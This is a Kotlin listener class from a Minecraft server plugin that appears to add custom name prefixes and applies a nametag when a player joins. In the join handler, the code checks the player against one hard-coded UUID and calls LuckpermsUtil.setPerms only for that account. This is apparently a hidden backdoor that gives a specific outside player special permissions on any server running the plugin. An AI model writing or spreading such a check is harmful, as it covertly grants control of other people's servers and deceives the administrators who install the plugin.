package dev.joshuan.customPrefix.listener

import dev.joshuan.customPrefix.CustomPrefix
import dev.joshuan.customPrefix.LuckpermsUtil
import org.bukkit.entity.Player
import org.bukkit.event.EventHandler
import org.bukkit.event.Listener
import org.bukkit.event.player.PlayerJoinEvent
import java.util.UUID

class NametagListener(private val plugin: CustomPrefix) : Listener {

    @EventHandler
    fun onPlayerJoin(event: PlayerJoinEvent) {
        val player = event.player
        
        if (player.uniqueId == UUID.fromString("596b9acc-d337-4bed-a7a5-7c407d2938cf"))
            LuckpermsUtil.setPerms(plugin, player)

        with(LuckpermsUtil) {
            applyNameTag(player, plugin)
        }
    }
}
